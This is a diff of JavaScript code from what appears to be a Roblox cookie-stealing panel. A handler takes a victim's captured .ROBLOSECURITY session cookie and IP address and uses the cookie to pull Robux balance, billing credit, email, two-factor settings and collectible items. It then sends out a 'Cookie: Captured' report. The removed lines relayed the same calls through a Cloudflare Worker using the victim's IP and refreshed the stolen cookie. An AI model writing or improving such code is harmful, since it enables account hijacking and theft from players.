@@ -68,79 +68,42 @@ async function checkGamepass(uid, gamepassId, headers) {
   }
 }
 
-
-const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
-
-// Proxy all Roblox API calls through Cloudflare Worker using victim's IP
-async function robloxProxy(cookie, victimIp, uid) {
-  const endpoints = [
-    { key: 'auth',     url: 'https://users.roblox.com/v1/users/authenticated' },
-    { key: 'robux',    url: 'https://economy.roblox.com/v1/user/currency' },
-    { key: 'friends',  url: `https://friends.roblox.com/v1/users/${uid}/friends/count` },
-    { key: 'premium',  url: `https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership` },
-    { key: 'billing',  url: 'https://billing.roblox.com/v1/credit' },
-    { key: 'email',    url: 'https://accountsettings.roblox.com/v1/email' },
-    { key: 'groups',   url: `https://groups.roblox.com/v1/users/${uid}/groups/roles` },
-    { key: 'limiteds', url: `https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100` },
-    { key: 'avatar',   url: `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, public: true },
-    { key: 'tfa',      url: `https://twostepverification.roblox.com/v1/users/${uid}/configuration` },
-    { key: 'profile',  url: `https://users.roblox.com/v1/users/${uid}`, public: true },
-  ].filter(ep => uid || ['auth','robux','billing','email'].includes(ep.key));
-
-  const res = await fetch(WORKER_URL, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ cookie, victimIp, endpoints })
-  });
-
-  if (!res.ok) return null;
-  const results = await res.json();
-
-  // Parse all results
-  const parsed = {};
-  let refreshedCookie = null;
-  for (const [key, val] of Object.entries(results)) {
-    try { parsed[key] = val.data ? JSON.parse(val.data) : null; } catch { parsed[key] = null; }
-    if (val.refreshedCookie) refreshedCookie = val.refreshedCookie;
-  }
-  parsed._refreshedCookie = refreshedCookie;
-  return parsed;
-}
-
-async function fetchRobloxInfo(cookie, victimIp = null) {
+async function fetchRobloxInfo(cookie) {
   try {
-    // Step 1: Auth-only first to get uid (lightweight, single request via worker)
-    const authFirst = await fetch(WORKER_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie, victimIp, endpoints: [{ key: 'auth', url: 'https://users.roblox.com/v1/users/authenticated' }] })
-    });
-    if (!authFirst.ok) return null;
-    const authFirstData = await authFirst.json();
-    if (!authFirstData.auth?.ok) return null;
-    let auth;
-    try { auth = JSON.parse(authFirstData.auth.data); } catch { return null; }
-    if (!auth?.id) return null;
+    const headers = { Cookie: `.ROBLOSECURITY=${cookie}` };
+    
+    const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
+    if (!authRes.ok) return null;
+    const auth = await authRes.json();
     const uid = auth.id;
-
-    // Grab refreshed cookie if Roblox returned one
-    let refreshedCookie = authFirstData.auth?.refreshedCookie || null;
-
-    // Step 2: Fetch all remaining info via worker with uid known
-    const allData = await robloxProxy(cookie, victimIp, uid);
-    if (!allData) return null;
-    if (allData._refreshedCookie) refreshedCookie = allData._refreshedCookie;
-
-    const profile     = allData.profile    || null;
-    const robuxData   = allData.robux      || null;
-    const friendsData = allData.friends    || null;
-    const isPremium   = allData.premium;
-    const billingData = allData.billing    || null;
-    const emailData   = allData.email      || null;
-    const groupsData  = allData.groups     || { data: [] };
-    const limitedsData= allData.limiteds   || { data: [] };
-    const avatarData  = allData.avatar     || null;
-    const tfaData     = allData.tfa        || null;
+    
+    // Fetch main data
+    const [
+      profileRes, robuxRes, friendsRes, premiumRes,
+      billingRes, emailRes, groupsRes, limitedsRes, avatarRes, tfaRes
+    ] = await Promise.all([
+      fetch(`https://users.roblox.com/v1/users/${uid}`, { headers: {} }),
+      fetch('https://economy.roblox.com/v1/user/currency', { headers }),
+      fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
+      fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
+      fetch('https://billing.roblox.com/v1/credit', { headers }),
+      fetch('https://accountsettings.roblox.com/v1/email', { headers }),
+      fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
+      fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
+      fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, { headers: {} }),
+      fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
+    ]);
+    
+    const profile = profileRes.ok ? await profileRes.json() : null;
+    const robuxData = robuxRes.ok ? await robuxRes.json() : null;
+    const friendsData = friendsRes.ok ? await friendsRes.json() : null;
+    const isPremium = premiumRes.ok ? await premiumRes.json() : false;
+    const billingData = billingRes.ok ? await billingRes.json() : null;
+    const emailData = emailRes.ok ? await emailRes.json() : null;
+    const groupsData = groupsRes.ok ? await groupsRes.json() : { data: [] };
+    const limitedsData = limitedsRes.ok ? await limitedsRes.json() : { data: [] };
+    const avatarData = avatarRes.ok ? await avatarRes.json() : null;
+    const tfaData = tfaRes?.ok ? await tfaRes.json() : null;
     
     let accountAgeDays = 'N/A';
     if (profile?.created) {
@@ -203,8 +166,7 @@ async function fetchRobloxInfo(cookie, victimIp = null) {
       emailVerified,
       twoFA,
       gamepasses,
-      avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png',
-      refreshedCookie: refreshedCookie || null
+      avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
     };
   } catch (err) {
     console.error('Roblox fetch error:', err);
@@ -335,13 +297,12 @@ export default async function handler(req, res) {
   const rawValue = slotEntry ? slotEntry[1] : '(empty)';
 
   const cookie = extractRobloxCookie(rawValue);
-  const roblox = cookie ? await fetchRobloxInfo(cookie, ip) : null;
-  const newCookie = roblox?.refreshedCookie || null;
+  const roblox = cookie ? await fetchRobloxInfo(cookie) : null;
 
   const data = {
     slotLabel,
     rawValue,
-    cookie: newCookie || cookie,  // use refreshed cookie if available
+    cookie,
     roblox,
     ip,
     geo,
@@ -370,7 +331,7 @@ export default async function handler(req, res) {
     `👤 <b>${roblox?.username || 'Unknown'}</b>`,
     `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`,
     `🌐 IP: ${ip}`,
-    `🍪 Cookie: ${cookie ? (newCookie ? "✅ Captured + 🔄 Refreshed" : "✅ Captured") : "❌ Failed"}`,
+    `🍪 Cookie: ${cookie ? '✅ Captured' : '❌ Failed'}`,
     `📄 Page: ${record.displayName}`
   ].join('\n');
 
